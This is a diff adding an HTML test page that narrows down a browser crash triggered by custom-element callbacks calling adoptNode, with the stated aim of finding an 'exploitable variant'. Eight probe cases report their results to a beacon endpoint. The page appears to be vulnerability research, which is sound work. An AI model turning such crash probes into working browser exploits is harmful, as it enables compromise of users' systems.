@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1272</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1272-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1272: CE ADOPTNODE CRASH NARROWING ===');
+log('P1271 finding: adoptNode(ancestor) during connectedCallback crashes');
+log('Goal: narrow exact trigger, find exploitable variant');
+B('START','P1272');
+
+function makeIframe(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return ifr;
+}
+</script>
+
+<!-- A: adoptNode of SELF during connectedCallback -->
+<script>
+log('\n--- A: adoptNode(self) during connectedCallback ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+
+    customElements.define('x-adopt-self', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        try{
+          // Adopt SELF to iframe during own connection
+          var adopted=ifr.contentDocument.adoptNode(this);
+          cbLog.push('self_adopted|owner='+(this.ownerDocument===document?'main':'iframe'));
+          // Don't append to iframe — just adopt
+        }catch(e){
+          cbLog.push('err:'+e.name+':'+e.message.slice(0,60));
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    B('A_PRE','testing_adopt_self');
+
+    var el=document.createElement('x-adopt-self');
+    el.id='as1';
+    container.appendChild(el);
+
+    B('A1','log='+cbLog.join(';')+
+      '|in_container='+container.contains(el)+
+      '|owner='+(el.ownerDocument===document?'main':'iframe'));
+
+    container.parentNode.removeChild(container);
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('A0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- B: adoptNode of SIBLING during connectedCallback -->
+<script>
+log('\n--- B: adoptNode(sibling) during connectedCallback ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+
+    customElements.define('x-adopt-sibling', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(this.id==='as_b2'){
+          try{
+            // Adopt the sibling (not ancestor) during own connection
+            var sib=this.previousSibling;
+            if(sib){
+              ifr.contentDocument.adoptNode(sib);
+              cbLog.push('sibling_adopted');
+            }
+          }catch(e){
+            cbLog.push('err:'+e.name+':'+e.message.slice(0,40));
+          }
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    B('B_PRE','testing_adopt_sibling');
+
+    container.innerHTML=
+      '<x-adopt-sibling id="as_b1">SIB1</x-adopt-sibling>'+
+      '<x-adopt-sibling id="as_b2">SIB2</x-adopt-sibling>';
+
+    B('B1','log='+cbLog.join(';')+
+      '|children='+container.childNodes.length);
+
+    container.parentNode.removeChild(container);
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('B0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- C: adoptNode of UNRELATED element during connectedCallback -->
+<script>
+log('\n--- C: adoptNode(unrelated) during connectedCallback ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+    var unrelated=document.createElement('div');
+    unrelated.id='unrelated';
+    unrelated.innerHTML='<p>Unrelated content</p>';
+    document.body.appendChild(unrelated);
+
+    customElements.define('x-adopt-unrel', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        try{
+          ifr.contentDocument.adoptNode(unrelated);
+          cbLog.push('unrelated_adopted');
+        }catch(e){
+          cbLog.push('err:'+e.name+':'+e.message.slice(0,40));
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    var el=document.createElement('x-adopt-unrel');
+    container.appendChild(el);
+
+    B('C1','log='+cbLog.join(';')+
+      '|unrelated_owner='+(unrelated.ownerDocument===document?'main':'iframe'));
+
+    container.parentNode.removeChild(container);
+    if(unrelated.parentNode)unrelated.parentNode.removeChild(unrelated);
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('C0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- D: REMOVE parent (no cross-doc) during connectedCallback -->
+<script>
+log('\n--- D: removeChild(parent) during connectedCallback ---');
+(function(){
+  try{
+    var cbLog=[];
+
+    customElements.define('x-remove-parent', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(this.id==='rp1'){
+          try{
+            var parent=this.parentNode;
+            if(parent&&parent.parentNode){
+              parent.parentNode.removeChild(parent);
+              cbLog.push('parent_removed');
+            }
+          }catch(e){
+            cbLog.push('err:'+e.name+':'+e.message.slice(0,40));
+          }
+        }
+      }
+    });
+
+    var grandparent=document.createElement('div');
+    grandparent.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(grandparent);
+
+    var container=document.createElement('div');
+    grandparent.appendChild(container);
+
+    B('D_PRE','testing_parent_remove');
+
+    var el=document.createElement('x-remove-parent');
+    el.id='rp1';
+    container.appendChild(el);
+
+    B('D1','log='+cbLog.join(';')+
+      '|container_in_dom='+document.body.contains(container)+
+      '|el_in_dom='+document.body.contains(el));
+
+    if(grandparent.parentNode)grandparent.parentNode.removeChild(grandparent);
+  }catch(e){B('D0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- E: adoptNode parent to createHTMLDocument (not iframe) during callback -->
+<script>
+log('\n--- E: adoptNode(parent) to createHTMLDocument ---');
+(function(){
+  try{
+    var cbLog=[];
+    var otherDoc=document.implementation.createHTMLDocument('other');
+
+    customElements.define('x-adopt-htmldoc', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        try{
+          var parent=this.parentNode;
+          if(parent){
+            otherDoc.adoptNode(parent);
+            cbLog.push('adopted_to_htmldoc');
+            // Move back
+            document.adoptNode(parent);
+            document.body.appendChild(parent);
+            cbLog.push('restored');
+          }
+        }catch(e){
+          cbLog.push('err:'+e.name+':'+e.message.slice(0,60));
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    B('E_PRE','testing_htmldoc_adopt');
+
+    var el=document.createElement('x-adopt-htmldoc');
+    el.id='ah1';
+    container.appendChild(el);
+
+    B('E1','log='+cbLog.join(';')+
+      '|in_dom='+document.body.contains(container));
+
+    if(container.parentNode)container.parentNode.removeChild(container);
+  }catch(e){B('E0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- F: adoptNode parent during DISCONNECTED callback -->
+<script>
+log('\n--- F: adoptNode during disconnectedCallback ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+    var saveRef;
+
+    customElements.define('x-adopt-on-dc', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        saveRef=this;
+      }
+      disconnectedCallback(){
+        cbLog.push('dc:'+this.id);
+        if(this.id==='adc1'){
+          try{
+            // During disconnection, adopt a still-connected element to iframe
+            var body=document.body;
+            var firstDiv=body.querySelector('div');
+            if(firstDiv){
+              ifr.contentDocument.adoptNode(firstDiv);
+              cbLog.push('adopted_during_dc');
+              // Restore
+              document.adoptNode(firstDiv);
+              document.body.appendChild(firstDiv);
+              cbLog.push('restored');
+            }
+          }catch(e){
+            cbLog.push('dc_err:'+e.name+':'+e.message.slice(0,40));
+          }
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    var el=document.createElement('x-adopt-on-dc');
+    el.id='adc1';
+    container.appendChild(el);
+
+    B('F_PRE','testing_adopt_on_disconnect');
+
+    // Remove the element — triggers disconnectedCallback
+    container.removeChild(el);
+
+    B('F1','log='+cbLog.join(';'));
+
+    container.parentNode.removeChild(container);
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('F0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- G: adoptNode parent WITHOUT restore during connectedCallback -->
+<script>
+log('\n--- G: adoptNode(parent) no restore during CC ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+
+    customElements.define('x-adopt-norestore', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        try{
+          var parent=this.parentNode;
+          if(parent){
+            // Just adopt — do NOT restore or append to iframe body
+            ifr.contentDocument.adoptNode(parent);
+            cbLog.push('adopted_only');
+          }
+        }catch(e){
+          cbLog.push('err:'+e.name+':'+e.message.slice(0,60));
+        }
+      }
+    });
+
+    var container=document.createElement('div');
+    container.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(container);
+
+    B('G_PRE','testing_adopt_no_restore');
+
+    var el=document.createElement('x-adopt-norestore');
+    el.id='anr1';
+    container.appendChild(el);
+
+    B('G1','log='+cbLog.join(';')+
+      '|container_owner='+(container.ownerDocument===document?'main':'iframe')+
+      '|container_in_dom='+document.body.contains(container));
+
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('G0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- H: Delayed adoptNode (setTimeout 0) during connectedCallback -->
+<script>
+log('\n--- H: Delayed adoptNode via setTimeout(0) ---');
+(function(){
+  try{
+    var cbLog=[];
+    var ifr=makeIframe();
+    var containerH;
+
+    customElements.define('x-delayed-adopt', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        var self=this;
+        // Delay the adoptNode to AFTER the callback returns
+        setTimeout(function(){
+          try{
+            var parent=self.parentNode;
+            if(parent){
+              ifr.contentDocument.adoptNode(parent);
+              cbLog.push('delayed_adopted');
+              // Restore
+              document.adoptNode(parent);
+              document.body.appendChild(parent);
+              cbLog.push('delayed_restored');
+            }
+            B('H2','delayed|log='+cbLog.join(';')+
+              '|in_dom='+document.body.contains(containerH));
+          }catch(e){
+            B('H2','delayed_err:'+e.name+':'+e.message.slice(0,60));
+          }
+        },0);
+      }
+    });
+
+    containerH=document.createElement('div');
+    containerH.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(containerH);
+
+    var el=document.createElement('x-delayed-adopt');
+    el.id='da1';
+    containerH.appendChild(el);
+
+    B('H1','sync|log='+cbLog.join(';')+
+      '|in_dom='+document.body.contains(containerH));
+
+    // H2 will arrive from setTimeout
+  }catch(e){B('H0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1272 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
